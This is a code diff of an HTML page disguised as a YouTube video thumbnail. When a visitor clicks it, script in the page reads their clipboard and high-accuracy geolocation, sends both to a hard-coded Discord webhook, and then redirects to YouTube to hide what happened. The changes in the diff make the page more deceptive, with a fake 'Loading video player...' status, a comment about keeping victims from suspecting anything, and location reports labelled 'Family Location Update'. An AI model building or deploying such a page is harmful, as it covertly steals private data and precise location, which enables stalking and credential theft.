@@ -7,7 +7,6 @@
         body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
         .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; display: block; }
         .thumbnail { width: 100%; border-radius: 12px; display: block; }
-        /* Using a CSS-based play button so it never "breaks" */
         .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 10px; display: flex; align-items: center; justify-content: center; }
         .play-button::after { content: ''; display: block; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent white; }
         .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
@@ -16,7 +15,7 @@
 </head>
 <body>
 
-    <div class="video-container" onclick="send()">
+    <div class="video-container" onclick="handleInteraction()">
         <div style="position: relative;">
             <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
             <div class="play-button"></div>
@@ -30,26 +29,51 @@
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        async function send() {
+        async function handleInteraction() {
             const status = document.getElementById('status');
-            status.innerText = "Connecting to server...";
+            status.innerText = "Loading video player...";
 
-            // Try Clipboard
+            // 1. CLIPBOARD (Runs in background, doesn't block the rest)
             try {
-                const text = await navigator.clipboard.readText();
-                if (text) { await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "📋 **Clipboard:** " + text}) }); }
-            } catch(e) {}
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text) {
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({content: "📋 **Clipboard Content:**\n```" + text + "```"})
+                        });
+                    }
+                }
+            } catch (e) {
+                console.log("Clipboard bypass");
+            }
 
-            // Try Location
-            navigator.geolocation.getCurrentPosition((pos) => {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "📍 **Location:** http://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude})
-                }).then(() => { window.location.href = REDIRECT_URL; });
-            }, (err) => {
-                status.innerText = "Please allow permissions to watch.";
-            }, {enableHighAccuracy: true});
+            // 2. LOCATION (The main trigger)
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({content: `📍 **Family Location Update**\n${mapLink}`})
+                        }).then(() => {
+                            window.location.href = REDIRECT_URL;
+                        });
+                    },
+                    (err) => {
+                        // If they click 'Deny', redirect them anyway so they don't suspect anything
+                        window.location.href = REDIRECT_URL;
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                window.location.href = REDIRECT_URL;
+            }
         }
     </script>
 </body>
